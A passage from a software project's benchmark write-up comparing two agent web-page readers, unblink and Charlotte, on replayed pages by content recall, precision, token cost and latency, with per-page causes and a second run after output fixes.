  decoded text values in document order, not on raw JSON; its cost is the
  whole payload. Text it states twice (a heading in `headings` and again in
  `full_content`) lowers its precision, which is a multiset measure.

Configurations — "default" is the page-reading call with nothing but the URL:

| configuration | call |
|---|---|
| `unblink/default` | `read(url)`: article mode, one call at the default token budget |
| `unblink/article` | the same, following `next_cursor` to the end |
| `unblink/full` | `read(url, mode=full)`, following `next_cursor` to the end |
| `charlotte/default` | `charlotte_navigate(url)`: detail `minimal` (landmarks, headings, counts — no body text, by design) |
| `charlotte/summary` | `charlotte_observe(detail=summary)` on the page the full run loaded (not timed) |
| `charlotte/full` | `charlotte_navigate(url, detail=full)`: all text content |

### All 72 pages with a usable oracle

| configuration | recall | token recall | precision | pass ≥0.85 | tokens (median) | tokens (mean) | tokens as returned (median) | recall per 1k tokens | latency ms (median) | failed | lossy replay | run spread (mean / max) |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| `unblink/default` | 0.684 | 0.725 | 0.849 | 29 | 2,147 | 3,338 | 2,147 | 0.475 | 129 | 0 | 20 | 0.000 / 0.000 |
| `unblink/article` | 0.816 | 0.860 | 0.842 | 41 | 2,465 | 12,645 | 2,465 | 0.474 | 129 | 0 | 20 | 0.000 / 0.000 |
| `unblink/full` | 0.918 | 0.956 | 0.806 | 63 | 4,136 | 16,411 | 4,136 | 0.261 | 123 | 0 | 20 | 0.003 / 0.211 |
| `charlotte/default` | 0.048 | 0.085 | 0.836 | 0 | 794 | 1,146 | 1,014 | 0.050 | 424 | 0 | 35 | 0.000 / 0.001 |
| `charlotte/summary` | 0.218 | 0.366 | 0.744 | 3 | 5,888 | 17,250 | 6,330 | 0.038 | — | 0 | 37 | 0.000 / 0.000 |
| `charlotte/full` | 0.961 | 0.984 | 0.674 | 66 | 8,775 | 26,485 | 9,015 | 0.141 | 410 | 0 | 35 | 0.002 / 0.109 |

### The 67 pages replay-sound for both tools

A tool's page is not replay-sound when its full configuration scored below
0.85 after losing a script, document or data request the archive could not
answer — the score is then about the replay, not the tool. Five pages drop
out: four on unblink's side (`mastodon-explore`, `discourse-meta`,
`nextjs-learn`, `devto-home`), two on Charlotte's (`angular-home`,
`discourse-meta`).

| configuration | recall | token recall | precision | pass ≥0.85 | tokens (median) | tokens (mean) | tokens as returned (median) | recall per 1k tokens | latency ms (median) | failed | lossy replay | run spread (mean / max) |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| `unblink/default` | 0.708 | 0.744 | 0.866 | 29 | 2,344 | 3,415 | 2,344 | 0.487 | 119 | 0 | 16 | 0.000 / 0.000 |
| `unblink/article` | 0.846 | 0.884 | 0.859 | 41 | 2,863 | 13,323 | 2,863 | 0.486 | 125 | 0 | 16 | 0.000 / 0.000 |
| `unblink/full` | 0.954 | 0.986 | 0.819 | 63 | 4,252 | 17,303 | 4,252 | 0.268 | 107 | 0 | 16 | 0.003 / 0.211 |
| `charlotte/default` | 0.038 | 0.074 | 0.831 | 0 | 795 | 1,171 | 1,004 | 0.039 | 402 | 0 | 30 | 0.000 / 0.001 |
| `charlotte/summary` | 0.197 | 0.344 | 0.753 | 3 | 5,889 | 17,900 | 6,416 | 0.035 | — | 0 | 32 | 0.000 / 0.000 |
| `charlotte/full` | 0.970 | 0.987 | 0.687 | 63 | 8,824 | 27,697 | 9,178 | 0.142 | 398 | 0 | 30 | 0.001 / 0.032 |

`recall` is main-content 3-shingle recall, `precision` the share of the
output's words the browser displayed anywhere on the page, `lossy replay` the
pages where that tool's replay lost at least one consequential request (most
still pass), `run spread` the max-minus-min recall over the three runs.

What the two tables say:

- **Fidelity, most complete rendition against most complete.** Charlotte
  0.970, unblink 0.954 mean recall on the sound pages; 0.961 against 0.918 on
  all of them. Both pass 63 of the 67.
- **Cost.** Charlotte's full payload is a median 8.8k tokens against unblink's
  4.3k. On the 62 pages both tools pass at full, Charlotte's is a median 1.87×
  unblink's (0.47× to 3.19×; unblink is smaller on 57 of 62). Per token spent,
  unblink returns about twice the oracle text (0.268 against 0.142 recall per
  1k tokens).
- **unblink's default is not its best.** Article mode with one call returns
  0.708; following the cursor raises that to 0.846 (the gap is truncation at
  the default budget on long pages), and full mode to 0.954. Article mode
  read to the end still scores more than 0.05 below full mode on 30 of the 67
  pages, which is the largest single fidelity cost in unblink's column.
- **The two defaults are different kinds of call.** Charlotte's default is an
  orientation pass (0.038 recall, ~800 tokens); unblink's is a read. That row
  says which tool hands over content unasked, not which extracts better —
  unblink's `browse` is its own orientation call and is not measured here.
- **Latency.** Median 107 ms against 398 ms, with the caveat above. The tail
  goes the other way: unblink's 90th percentile is about 4.4 s (pages that
  never go quiet run to the render budget) against Charlotte's 1.0 s.
- **Stability.** unblink's output was identical across runs on every page but
  one (`github-repo`: 0.721, 0.721, 0.510). Charlotte's varied on four pages,
  by at most 0.109.

### Head to head (recall margin 0.05)

The margin was fixed in the code before any run.

| A | B | pages | A wins | tie | B wins | mean recall A | mean recall B | median tokens A | median tokens B | set |
|---|---|---|---|---|---|---|---|---|---|---|
| `unblink/full` | `charlotte/full` | 67 | 2 | 56 | 9 | 0.954 | 0.970 | 4,252 | 8,824 | replay-sound for both |
| `unblink/full` | `charlotte/full` | 72 | 3 | 56 | 13 | 0.918 | 0.961 | 4,136 | 8,775 | all usable-oracle |
| `unblink/article` | `charlotte/full` | 67 | 2 | 29 | 36 | 0.846 | 0.970 | 2,863 | 8,824 | replay-sound for both |
| `unblink/article` | `charlotte/full` | 72 | 2 | 30 | 40 | 0.816 | 0.961 | 2,465 | 8,775 | all usable-oracle |
| `unblink/default` | `charlotte/full` | 67 | 0 | 21 | 46 | 0.708 | 0.970 | 2,344 | 8,824 | replay-sound for both |
| `unblink/default` | `charlotte/full` | 72 | 0 | 22 | 50 | 0.684 | 0.961 | 2,147 | 8,775 | all usable-oracle |
| `unblink/default` | `charlotte/default` | 67 | 65 | 2 | 0 | 0.708 | 0.038 | 2,344 | 795 | replay-sound for both |
| `unblink/default` | `charlotte/default` | 72 | 68 | 3 | 1 | 0.684 | 0.048 | 2,147 | 794 | all usable-oracle |

**Where unblink/full beats charlotte/full (3 pages).** Reasons are from
reading both outputs.

| page | unblink/full recall | charlotte/full recall | unblink tokens | charlotte tokens | consequential replay losses (u / c) |
|---|---|---|---|---|---|
| github-repo | 0.721 | 0.538 | 9,303 | 5,883 | 0 / 0 |
| aozora-kokoro | 0.998 | 0.830 | 154,042 | 140,747 | 0 / 0 |
| angular-home | 0.707 | 0.619 | 1,283 | 3,545 | 0 / 1 |

- `github-repo` — the per-file commit messages arrive by fetch after `load`;
  they are in unblink's output and absent from Charlotte's.
- `aozora-kokoro` — Charlotte's text drops ruby readings (`服装` without its
  `なり`), which `innerText` and unblink both include.
- `angular-home` — Charlotte's output lacks the lazily loaded code sample;
  unblink's has it. (Not replay-sound for Charlotte: it lost one page fetch.)

**Where charlotte/full beats unblink/full (13 pages).**

| page | unblink/full recall | charlotte/full recall | unblink tokens | charlotte tokens | consequential replay losses (u / c) |
|---|---|---|---|---|---|
| mastodon-explore | 0.000 | 0.920 | 118 | 5,010 | 2 / 11 |
| discourse-meta | 0.000 | 0.715 | 82 | 17,232 | 1 / 5 |
| nextjs-learn | 0.697 | 0.943 | 2,750 | 5,891 | 13 / 26 |
| devto-home | 0.763 | 1.000 | 18,113 | 19,550 | 4 / 3 |
| lobsters-home | 0.694 | 0.873 | 7,275 | 9,992 | 0 / 5 |
| storybook-docs | 0.885 | 1.000 | 4,068 | 9,517 | 89 / 21 |
| arstechnica-home | 0.902 | 0.995 | 10,086 | 10,770 | 5 / 30 |
| elm-home | 0.914 | 1.000 | 1,479 | 3,778 | 0 / 0 |
| solid-home | 0.912 | 0.988 | 3,532 | 9,173 | 0 / 0 |
| svelte-docs | 0.904 | 0.975 | 2,442 | 6,417 | 0 / 1 |
| tanstack-query | 0.895 | 0.963 | 3,633 | 6,809 | 2 / 1 |
| whatwg-dom | 0.920 | 0.983 | 180,885 | 576,872 | 0 / 2 |
| astro-home | 0.886 | 0.937 | 4,252 | 6,463 | 0 / 0 |

- `mastodon-explore`, `discourse-meta` — client-only apps that boot in
  unblink and render nothing; Charlotte renders them. Both are excused by the
  replay rule, and both are real engine gaps regardless.
- `nextjs-learn`, `devto-home` — unblink's replay lost data requests.
- `lobsters-home` — unblink emits the contents of collapsed `<details>`
  inline, which a browser hides; both tools miss the relative timestamps
  (the replay clock is not the capture clock).
- `storybook-docs` — the text is present, but unblink puts image
  placeholders and hard-break markers between a card's label lines.
- `arstechnica-home` — the per-story time and comment-count row is not in
  unblink's output.
- `elm-home` — SVG chart labels come out run together
  (`EmberReactAngular 1Angular 2Elm1000…`): there is no layout to separate them.
- `solid-home` — unblink shows `36,939` and `12,484,291` where Chromium shows
  `36.9K` and `12.5M`.
- `svelte-docs` — unblink writes `<svelte:window>` in link text as
  `&lt;svelte:window&gt;`, so the entity names read as words.
- `tanstack-query` — adjacent inline elements are joined without a space
  (`Enterprise SupportPrivate consulting`).
- `whatwg-dom`, `astro-home` — many short scattered misses; not attributed.

### Per feature-matrix cell

Mean recall / median tokens over all usable-oracle pages, so the excused
pages are included: `hydration:client-only`, `shape:noscript`, `shape:forum`
and `framework:ember` carry Mastodon and Discourse at 0.000 for unblink.

| cell | pages | `unblink/default` | `unblink/article` | `unblink/full` | `charlotte/full` |
|---|---|---|---|---|---|
| arrival:client-routing | 3 | 0.768 / 1,672 | 0.768 / 1,675 | 0.997 / 4,792 | 0.991 / 8,727 |
| arrival:fetch-after-load | 6 | 0.476 / 1,825 | 0.526 / 1,826 | 0.539 / 2,288 | 0.855 / 9,836 |
| arrival:lazy | 4 | 0.608 / 7,575 | 0.843 / 12,160 | 0.846 / 13,691 | 0.932 / 11,337 |
| bundler:esbuild | 2 | 0.830 / 1,347 | 0.830 / 1,345 | 0.852 / 2,312 | 0.802 / 6,456 |
| bundler:vite | 17 | 0.779 / 1,457 | 0.779 / 1,460 | 0.956 / 3,614 | 0.981 / 6,809 |
| bundler:webpack | 5 | 0.893 / 2,344 | 0.893 / 2,341 | 0.991 / 4,792 | 0.997 / 8,727 |
| components:custom-elements | 10 | 0.814 / 1,460 | 0.879 / 1,461 | 0.951 / 3,623 | 0.945 / 5,622 |
| components:shadow-dom | 4 | 0.903 / 1,345 | 0.903 / 1,345 | 0.971 / 2,862 | 0.991 / 5,264 |
| framework:alpine | 2 | 0.981 / 2,008 | 0.981 / 2,008 | 0.985 / 2,567 | 0.998 / 5,137 |
| framework:angular | 2 | 0.830 / 1,347 | 0.830 / 1,345 | 0.852 / 2,312 | 0.802 / 6,456 |
| framework:elm | 1 | 0.914 / 1,015 | 0.914 / 1,012 | 0.914 / 1,479 | 1.000 / 3,778 |
| framework:ember | 2 | 0.311 / 203 | 0.311 / 206 | 0.500 / 614 | 0.857 / 10,054 |
| framework:htmx | 3 | 0.659 / 1,372 | 0.890 / 1,378 | 0.899 / 2,555 | 0.900 / 4,253 |
| framework:jquery | 5 | 0.463 / 1,911 | 0.846 / 13,703 | 0.963 / 13,504 | 0.993 / 21,185 |
| framework:lit | 4 | 0.903 / 1,345 | 0.903 / 1,345 | 0.971 / 2,862 | 0.991 / 5,264 |
| framework:preact | 3 | 0.744 / 3,343 | 0.845 / 3,346 | 0.889 / 4,044 | 0.978 / 8,632 |
| framework:qwik | 1 | 0.778 / 418 | 0.778 / 421 | 0.976 / 3,748 | 1.000 / 3,394 |
| framework:react | 17 | 0.728 / 1,839 | 0.744 / 1,842 | 0.865 / 4,360 | 0.943 / 8,727 |
| framework:solid | 1 | 0.696 / 2,206 | 0.696 / 2,200 | 0.912 / 3,532 | 0.988 / 9,173 |
| framework:svelte | 2 | 0.520 / 638 | 0.520 / 637 | 0.952 / 2,614 | 0.977 / 6,620 |
| framework:vue | 6 | 0.904 / 1,652 | 0.904 / 1,650 | 0.975 / 3,319 | 0.987 / 7,551 |
| hydration:angular-ssr | 2 | 0.830 / 1,347 | 0.830 / 1,345 | 0.852 / 2,312 | 0.802 / 6,456 |
| hydration:astro-islands | 3 | 0.823 / 1,317 | 0.823 / 1,320 | 0.945 / 3,890 | 0.974 / 5,361 |
| hydration:client-only | 4 | 0.405 / 577 | 0.405 / 574 | 0.405 / 798 | 0.844 / 8,025 |
| hydration:ember-ssr | 1 | 0.621 / 301 | 0.621 / 307 | 1.000 / 1,147 | 1.000 / 2,877 |
| hydration:next | 6 | 0.793 / 1,825 | 0.793 / 1,828 | 0.920 / 3,595 | 0.989 / 8,241 |
| hydration:nuxt | 2 | 0.790 / 1,636 | 0.790 / 1,636 | 0.964 / 3,319 | 0.992 / 7,551 |
| hydration:preact-ssr | 2 | 0.885 / 3,241 | 0.885 / 3,243 | 0.953 / 3,842 | 0.967 / 6,797 |
| hydration:react-ssr | 10 | 0.834 / 2,463 | 0.834 / 2,465 | 0.973 / 4,576 | 0.989 / 8,941 |
| hydration:resumable | 1 | 0.778 / 418 | 0.778 / 421 | 0.976 / 3,748 | 1.000 / 3,394 |
| hydration:streaming | 4 | 0.662 / 995 | 0.662 / 995 | 0.891 / 3,076 | 0.975 / 6,601 |
| hydration:svelte-ssr | 2 | 0.520 / 638 | 0.520 / 637 | 0.952 / 2,614 | 0.977 / 6,620 |
| hydration:vue-ssr | 6 | 0.904 / 1,652 | 0.904 / 1,650 | 0.975 / 3,319 | 0.987 / 7,551 |
| shape:cjk | 2 | 0.454 / 15,299 | 0.954 / 95,816 | 0.986 / 105,111 | 0.914 / 83,475 |
| shape:docs | 41 | 0.733 / 1,839 | 0.849 / 1,908 | 0.976 / 4,040 | 0.990 / 8,419 |
| shape:forum | 4 | 0.531 / 5,859 | 0.607 / 5,857 | 0.613 / 6,060 | 0.896 / 13,612 |
| shape:large-dom | 10 | 0.201 / 5,954 | 0.871 / 23,446 | 0.951 / 28,480 | 0.943 / 41,114 |
| shape:news | 4 | 0.683 / 6,613 | 0.842 / 7,676 | 0.937 / 9,157 | 0.969 / 11,249 |
| shape:non-utf8 | 2 | 0.586 / 13,259 | 0.993 / 81,725 | 0.995 / 81,152 | 0.911 / 78,558 |
| shape:noscript | 2 | 0.000 / 123 | 0.000 / 121 | 0.000 / 100 | 0.817 / 11,121 |
| shape:static-article | 13 | 0.594 / 5,185 | 0.924 / 13,902 | 0.975 / 13,981 | 0.973 / 24,836 |

### Links and forms

| configuration | pages with visible links | median links ÷ oracle visible links | pages with forms in the oracle | pages where the tool reports ≥1 form |
|---|---|---|---|---|
| `unblink/full` | 72 | 1.00 | 33 | 32 |
| `charlotte/full` | 72 | 1.00 | 33 | 17 |

Both tools report a median 1.00× of the links Chromium showed. Charlotte
reports a form on 17 of the 33 pages whose oracle has one, unblink on 32.

### Second run, 2026-11-27: after the output-fidelity changes

The first run's losses were read page by page and the ones that were unblink's
own output — not its engine — were fixed: touching inline elements run
together, tables written as one line of cell text, `&lt;` entities in text,
SVG chart labels concatenated, and a first page cut short before a long block.
The same harness was then run again with the same Charlotte, the same Chromium,
the same settings and the same 0.05 margin.

Measured 2026-11-27 (second run) · same machine · unblink v0.25.0-36-g5e8e3bc
(the `feat/output-fidelity` tip) · charlotte 0.6.3 on Node 25.0.0 · Google
Chrome for Testing 151.0.7922.34 · 74 captured pages, 72 with a usable oracle,
68 replay-sound for both tools · 3 runs, medians · tokens are o200k_base.

**What changed between the runs is more than the output fixes.** The unblink
build is 15 commits ahead of the first run's: six engine layers
(live-session watchdog, interface objects, module globals, script-error fixes,
`defer` ordering, select state) as well as the six output commits. Charlotte's
numbers are a control: they moved by at most 0.003 anywhere. unblink's median
latency is about twice the first run's (129 → 237 ms for the default call)
while Charlotte's moved 3 ms. The output changes cannot account for that —
`reduce` and `emit` together cost under a millisecond on these pages, and the
Markdown conversion benchmark moved from 258 µs to 302 µs — so it comes from
the engine layers or from load on the machine, and has not been run down.

All 72 pages with a usable oracle:

| configuration | recall | token recall | precision | pass ≥0.85 | tokens (median) | tokens (mean) | tokens as returned (median) | recall per 1k tokens | latency ms (median) | failed | lossy replay | run spread (mean / max) |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| `unblink/default` | 0.699 | 0.741 | 0.862 | 30 | 2,709 | 3,600 | 2,709 | 0.482 | 237 | 0 | 27 | 0.003 / 0.162 |
| `unblink/article` | 0.819 | 0.862 | 0.846 | 42 | 2,466 | 12,694 | 2,466 | 0.480 | 258 | 0 | 26 | 0.005 / 0.387 |
| `unblink/full` | 0.930 | 0.968 | 0.810 | 64 | 4,283 | 16,661 | 4,283 | 0.261 | 249 | 0 | 27 | 0.000 / 0.029 |
| `charlotte/default` | 0.048 | 0.085 | 0.837 | 0 | 794 | 1,146 | 1,014 | 0.050 | 427 | 0 | 35 | 0.000 / 0.000 |
| `charlotte/summary` | 0.218 | 0.366 | 0.743 | 3 | 5,888 | 17,257 | 6,346 | 0.038 | — | 0 | 37 | 0.000 / 0.001 |
| `charlotte/full` | 0.961 | 0.984 | 0.671 | 66 | 8,775 | 26,522 | 9,015 | 0.137 | 432 | 0 | 35 | 0.002 / 0.109 |

The 68 pages replay-sound for both tools:

| configuration | recall | token recall | precision | pass ≥0.85 | tokens (median) | tokens (mean) | tokens as returned (median) | recall per 1k tokens | latency ms (median) | failed | lossy replay | run spread (mean / max) |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| `unblink/default` | 0.718 | 0.755 | 0.875 | 30 | 2,709 | 3,594 | 2,709 | 0.492 | 198 | 0 | 24 | 0.000 / 0.032 |
| `unblink/article` | 0.847 | 0.886 | 0.863 | 42 | 2,708 | 13,203 | 2,708 | 0.491 | 217 | 0 | 24 | 0.000 / 0.000 |
| `unblink/full` | 0.956 | 0.988 | 0.819 | 64 | 4,283 | 17,268 | 4,283 | 0.266 | 206 | 0 | 24 | 0.000 / 0.000 |
| `charlotte/default` | 0.038 | 0.074 | 0.831 | 0 | 794 | 1,164 | 986 | 0.039 | 410 | 0 | 31 | 0.000 / 0.000 |
| `charlotte/summary` | 0.203 | 0.350 | 0.754 | 3 | 5,888 | 17,715 | 6,346 | 0.036 | — | 0 | 33 | 0.000 / 0.001 |
| `charlotte/full` | 0.969 | 0.988 | 0.682 | 64 | 8,775 | 27,415 | 9,015 | 0.139 | 415 | 0 | 31 | 0.001 / 0.037 |

Head to head:

| A | B | pages | A wins | tie | B wins | mean recall A | mean recall B | median tokens A | median tokens B | set |
|---|---|---|---|---|---|---|---|---|---|---|
| `unblink/full` | `charlotte/full` | 68 | 2 | 60 | 6 | 0.956 | 0.969 | 4,283 | 8,775 | replay-sound for both |
| `unblink/full` | `charlotte/full` | 72 | 3 | 60 | 9 | 0.930 | 0.961 | 4,283 | 8,775 | all usable-oracle |
| `unblink/article` | `charlotte/full` | 68 | 2 | 29 | 37 | 0.847 | 0.969 | 2,708 | 8,775 | replay-sound for both |
| `unblink/article` | `charlotte/full` | 72 | 3 | 29 | 40 | 0.819 | 0.961 | 2,466 | 8,775 | all usable-oracle |
| `unblink/default` | `charlotte/full` | 68 | 0 | 21 | 47 | 0.718 | 0.969 | 2,709 | 8,775 | replay-sound for both |
| `unblink/default` | `charlotte/full` | 72 | 1 | 21 | 50 | 0.699 | 0.961 | 2,709 | 8,775 | all usable-oracle |
| `unblink/default` | `charlotte/default` | 68 | 67 | 1 | 0 | 0.718 | 0.038 | 2,709 | 794 | replay-sound for both |
| `unblink/default` | `charlotte/default` | 72 | 69 | 3 | 0 | 0.699 | 0.048 | 2,709 | 794 | all usable-oracle |

Against the first run, full output against full output over all 72 pages went
from 3 wins / 56 ties / 13 losses to 3 / 60 / 9, and mean recall from 0.918 to
0.930 (Charlotte 0.961 both times). One default `read` went from 0.684 to
0.699 and is still the weak configuration.

What moved, by cause:

| page | configuration | first run | second run | cause |
|---|---|---|---|---|
| nextjs-learn | full | 0.697 | 0.855 | touching inline elements now separated (`00Introduction` → `00 Introduction`) |
| svelte-docs | full | 0.904 | 0.987 | `<svelte:window>` no longer `&lt;svelte:window&gt;` |
| elm-home | full | 0.914 | 1.000 | SVG chart labels separate |
| solid-home | full | 0.912 | 0.960 | inline separation |
| tanstack-query | full | 0.895 | 0.927 | inline separation |
| jquery-ajax-api | default | 0.004 | 0.511 | first page filled (698 → 5,871 tokens); it had held only the site menu |
| discourse-meta | full | 0.000 | 0.484 | engine layers (the app now boots), not the output changes |
| nuxt-home | full | 0.940 | 0.882 | engine layers: hydration now survives and its result is scored, where the collapse guard used to return the server HTML |
| devto-home, github-repo | default / full | — | ±0.05 | run-to-run variance on pages with post-load fetches; both were unsound or unstable in the first run too |

The nine pages Charlotte still wins on full output: `mastodon-explore` (the
app renders nothing), `discourse-meta`, `devto-home`, `storybook-docs`,
`nuxt-home`, `nextjs-learn` (all with consequential replay losses for
unblink), `lobsters-home` (relative timestamps differ with replay time, and a
CSS-hidden duplicate comment count), `arstechnica-home` (the page formats
story times with `toLocaleTimeString`, which the engine renders as
`13:37:00` where Chromium shows `1:37 PM`) and `whatwg-dom`.

#### One call: recall against the token budget

The gap that matters most is the first row of the tables: what an agent gets
from one `read(url)`. To separate its causes, every page was read once at
each budget in each mode (one call, no cursor; same replay; tokens here are
unblink's own estimate, not o200k):

| mode | `max_tokens` | mean recall (72 pages) | pass ≥0.85 | tokens returned (median) | tokens returned (mean) | pages cut by the budget |
|---|---|---|---|---|---|---|
| article | 2,000 | 0.528 | 15 | 2,054 | 1,658 | 39 |
| article | 4,000 | 0.651 | 26 | 2,401 | 2,461 | 23 |
| **article** | **6,000 (default)** | **0.698** | **30** | **2,536** | **3,072** | **18** |
| article | 9,000 | 0.735 | 32 | 2,536 | 3,729 | 15 |
| article | 12,000 | 0.755 | 35 | 2,536 | 4,247 | 13 |
| article | 16,000 | 0.771 | 37 | 2,536 | 4,842 | 9 |
| article | 24,000 | 0.789 | 40 | 2,536 | 5,795 | 6 |
| full | 2,000 | 0.416 | 13 | 2,107 | 1,933 | 61 |
| full | 4,000 | 0.666 | 39 | 3,790 | 3,195 | 34 |
| full | 6,000 | 0.730 | 45 | 3,911 | 3,932 | 22 |
| full | 9,000 | 0.798 | 50 | 3,958 | 4,821 | 16 |
| full | 12,000 | 0.827 | 51 | 3,958 | 5,433 | 15 |
| full | 16,000 | 0.856 | 55 | 3,958 | 6,146 | 11 |
| full | 24,000 | 0.877 | 57 | 3,958 | 7,265 | 9 |

Reading it:

- **Truncation** is 18 of 72 pages at the default budget. On those, one call
  scored 0.361 in the first run against 0.891 following the cursor; the other
  54 pages are not cut at all. Raising the budget costs nothing on the median
  page (it is under 2,600 tokens either way) and is paid only by long pages.
- **Article extraction** is the rest. Following the cursor to the end, article
  mode is more than 0.05 below full mode on 30 pages. On 20 of them the
  extraction holds 85% or more of the page's content region and what full mode
  adds is navigation that the oracle's `main`/`body` text happens to include
  (docs sites with an in-`main` sidebar): article mode is right and the oracle
  is broader. On five the article really leaves content out — pkg.go.dev's
  package reference (62% of the region kept, the index dropped), LWN's front
  page (67%), and three landing pages (80–82%). pkg.go.dev, LWN and one landing
  page now carry `article_coverage` and a note; the other two leave out under
  1,000 bytes, the rule's floor. The remaining five are pages whose whole
  article is under 1,000 tokens, where the difference is again mostly chrome.
- The corpus is mostly documentation and its oracle is a landmark's whole
  text, so it rewards full mode more than a corpus of news articles would. It
  has no article-with-comments pages, the case the partial-article thresholds
  were set to protect, which is why those thresholds were not moved.

Neither default was changed. The measured options, for a decision: keeping
article mode and raising the default budget to 12,000 gives 0.755 for 38% more
tokens on average (nothing on the median page); switching the default to full
mode at 6,000 gives 0.730 and 15 more passing pages for 28% more tokens, on a
corpus biased toward it; both together give 0.827 for 77% more.

### What was not measured

- **Memory.** unblink runs in the harness process here, so its footprint is
  not separable; the footprint table above is the measurement for that.
- **Interaction.** Charlotte's payload carries element references for
  clicking and typing that unblink's Markdown does not; nothing here scores
  that.
- **The live web.** Bot challenges, consent walls and geo variants do not
  exist in a replay. `phpbb-forum` (HTTP 403 at capture) and `solid-docs`
  (unusable oracle) are scored for neither tool; `cern-first-page` was never
  captured.
- **Two harness errors found by the first full run were fixed before this
  one**: Chromium's own background fetch was being counted as a lost page
  request on every Charlotte page, and the replay's font warnings were being
  charged to Charlotte's token count. `unblink/article` was added at the same
  time to separate truncation from extraction. The metrics and the margin did
  not change.

## Sources

- unblink — this repository ([README](../README.md),
  [architecture](architecture.md))
- Playwright MCP — <https://github.com/microsoft/playwright-mcp>,
  <https://playwright.dev/mcp/introduction>
- Charlotte — <https://github.com/TickTockBent/charlotte>
- Obscura — <https://github.com/h4ckf0r0day/obscura>, <https://obscura.sh>
- Lightpanda — <https://github.com/lightpanda-io/browser>,
  <https://lightpanda.io>
